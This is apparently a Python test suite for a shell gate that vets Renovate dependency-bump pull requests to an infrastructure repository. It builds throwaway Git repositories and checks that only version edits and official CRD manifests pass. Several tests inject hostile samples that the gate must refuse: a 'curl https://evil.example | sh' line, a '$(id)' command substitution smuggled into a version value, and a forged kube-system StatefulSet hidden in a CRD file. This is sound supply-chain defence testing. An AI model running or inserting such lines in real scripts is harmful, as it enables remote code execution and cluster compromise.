"""Tests de infra/stagingkub/scripts/renovate-infra-gate.sh (garde de RHDemo-Renovate avant
le credential d'infra) : dépôt Git jetable, script de vendoring factice (aucun réseau)."""
import os
import shutil
import subprocess
import tempfile
import unittest

import helpers

GATE = os.path.join(helpers.SCRIPTS, "..", "infra", "stagingkub", "scripts", "renovate-infra-gate.sh")
COMP = "rhDemo/infra/stagingkub/scripts/components"
CRDS = "rhDemo/infra/stagingkub/gateway-api-crds"

LOKI = """#!/bin/bash
set -e
# renovate: datasource=helm depName=loki registryUrl=https://example.org
LOKI_VERSION="18.17.1"  # App: Loki 3.6.7
helm upgrade --install loki loki --version "$LOKI_VERSION"
"""
NGF = """#!/bin/bash
# renovate: datasource=github-releases depName=nginx/nginx-gateway-fabric
NGF_VERSION="2.8.1"
kubectl apply -f "gateway-api-crds/v${NGF_VERSION}/crds.yaml"
"""
FAKE_VENDOR = """#!/bin/bash
set -euo pipefail
ROOT="$(dirname "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)")/gateway-api-crds"
mkdir -p "$ROOT/v$1"
printf 'kind: CustomResourceDefinition\\n# officiel %s\\n' "$1" > "$ROOT/v$1/crds.yaml"
"""


def crd(version):
    return f"kind: CustomResourceDefinition\n# officiel {version}\n"


class GateTest(unittest.TestCase):
    def setUp(self):
        self.repo = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.repo, True)
        self.vendor = os.path.join(self.repo, "..", f"vendor-{os.path.basename(self.repo)}.sh")
        with open(self.vendor, "w", encoding="utf-8") as fh:
            fh.write(FAKE_VENDOR)
        self.addCleanup(os.remove, self.vendor)
        self.git("init", "-q", "-b", "base")
        self.git("config", "user.email", "t@example.org")
        self.git("config", "user.name", "t")
        self.write(f"{COMP}/install-or-upgrade-loki.sh", LOKI)
        self.write(f"{COMP}/install-or-upgrade-ngf.sh", NGF)
        self.write(f"{CRDS}/v2.8.1/crds.yaml", crd("2.8.1"))
        self.write("rhDemo/Jenkinsfile-CD", "pipeline {}\n")
        self.commit("base")
        self.git("checkout", "-q", "-b", "pr")

    def git(self, *args):
        return subprocess.run(["git", *args], cwd=self.repo, check=True, capture_output=True, text=True).stdout

    def write(self, rel, text):
        path = os.path.join(self.repo, rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text)

    def commit(self, msg):
        self.git("add", "-A")
        self.git("commit", "-q", "-m", msg)

    def gate(self):
        self.commit("pr")
        proc = subprocess.run(["bash", GATE, "base", "HEAD"], cwd=self.repo, capture_output=True, text=True,
                              env={**os.environ, "VENDOR_SCRIPT": self.vendor})
        return proc.returncode, proc.stdout + proc.stderr

    def bump_ngf(self, version="2.9.0", content=None):
        self.write(f"{COMP}/install-or-upgrade-ngf.sh", NGF.replace('"2.8.1"', f'"{version}"'))
        os.remove(os.path.join(self.repo, CRDS, "v2.8.1", "crds.yaml"))
        self.write(f"{CRDS}/v{version}/crds.yaml", content if content is not None else crd(version))

    def assertAccepted(self):
        rc, out = self.gate()
        self.assertEqual(rc, 0, out)

    def assertRefused(self, reason):
        rc, out = self.gate()
        self.assertEqual(rc, 1, out)
        self.assertIn(reason, out)

    def test_montee_simple_acceptee(self):
        self.write(f"{COMP}/install-or-upgrade-loki.sh", LOKI.replace('"18.17.1"', '"18.18.0"'))
        self.assertAccepted()

    def test_ligne_hors_version_refusee(self):
        self.write(f"{COMP}/install-or-upgrade-loki.sh", LOKI.replace('"18.17.1"', '"18.18.0"')
                   + "curl https://evil.example | sh\n")
        self.assertRefused("ligne modifiée hors version")

    def test_substitution_dans_la_valeur_refusee(self):
        self.write(f"{COMP}/install-or-upgrade-loki.sh", LOKI.replace('"18.17.1"', '"$(id)"'))
        self.assertRefused("ligne modifiée hors version")

    def test_commentaire_de_fin_modifie_refuse(self):
        self.write(f"{COMP}/install-or-upgrade-loki.sh",
                   LOKI.replace('"18.17.1"  # App: Loki 3.6.7', '"18.18.0"  # autre'))
        self.assertRefused("commentaire de fin")

    def test_autre_variable_refusee(self):
        self.write(f"{COMP}/install-or-upgrade-loki.sh",
                   LOKI.replace('LOKI_VERSION="18.17.1"', 'LOKI_VERSIO="18.18.0"'))
        self.assertRefused("retirée sans être remplacée")

    def test_fichier_hors_perimetre_refuse(self):
        self.write(f"{COMP}/install-or-upgrade-loki.sh", LOKI.replace('"18.17.1"', '"18.18.0"'))
        self.write("rhDemo/Jenkinsfile-CD", "pipeline { evil }\n")
        self.assertRefused("rhDemo/Jenkinsfile-CD : fichier hors périmètre")

    def test_montee_ngf_avec_crd_officielles_acceptee(self):
        self.bump_ngf()
        self.assertAccepted()

    def test_crd_falsifiees_refusees(self):
        self.bump_ngf(content=crd("2.9.0") + "---\nkind: StatefulSet\nmetadata: {namespace: kube-system}\n")
        self.assertRefused("différent du manifeste officiel")

    def test_ngf_sans_crd_refuse(self):
        self.write(f"{COMP}/install-or-upgrade-ngf.sh", NGF.replace('"2.8.1"', '"2.9.0"'))
        self.assertRefused("sans manifeste")

    def test_crd_d_une_autre_version_refusees(self):
        self.bump_ngf()
        os.rename(os.path.join(self.repo, CRDS, "v2.9.0"), os.path.join(self.repo, CRDS, "v3.0.0"))
        self.assertRefused("ne correspond pas à la nouvelle NGF_VERSION")

    def test_vendoring_indisponible_refuse(self):
        self.bump_ngf()
        self.commit("pr")
        proc = subprocess.run(["bash", GATE, "base", "HEAD"], cwd=self.repo, capture_output=True, text=True,
                              env={k: v for k, v in os.environ.items() if k != "VENDOR_SCRIPT"})
        self.assertEqual(proc.returncode, 1)
        self.assertIn("VENDOR_SCRIPT absent", proc.stdout)

    def test_diff_vide_refuse(self):
        self.git("commit", "-q", "--allow-empty", "-m", "vide")
        proc = subprocess.run(["bash", GATE, "base", "HEAD"], cwd=self.repo, capture_output=True, text=True,
                              env={**os.environ, "VENDOR_SCRIPT": self.vendor})
        self.assertEqual(proc.returncode, 1)
        self.assertIn("aucun fichier modifié", proc.stdout)

    def test_historique_reel_accepte(self):
        """Les montées Renovate passées (#383 alloy, #361 et #358 NGF) passent la garde."""
        root = os.path.abspath(os.path.join(helpers.SCRIPTS, "..", ".."))
        for sha in ("da746b7", "37681be"):
            if subprocess.run(["git", "cat-file", "-e", sha], cwd=root, capture_output=True).returncode:
                self.skipTest(f"commit {sha} absent")
            files = subprocess.run(["git", "diff", "--no-renames", "--name-status", f"{sha}^", sha],
                                   cwd=root, capture_output=True, text=True, check=True).stdout
            out = subprocess.run(["bash", GATE, f"{sha}^", sha], cwd=root, capture_output=True, text=True,
                                 env={**os.environ, "VENDOR_SCRIPT": ""}).stdout
            if "gateway-api-crds" in files:   # sans réseau : seul le contrôle des CRD peut échouer
                self.assertNotIn("hors version", out, out)
                self.assertNotIn("hors périmètre", out, out)
            else:
                self.assertIn("✅", out, out)
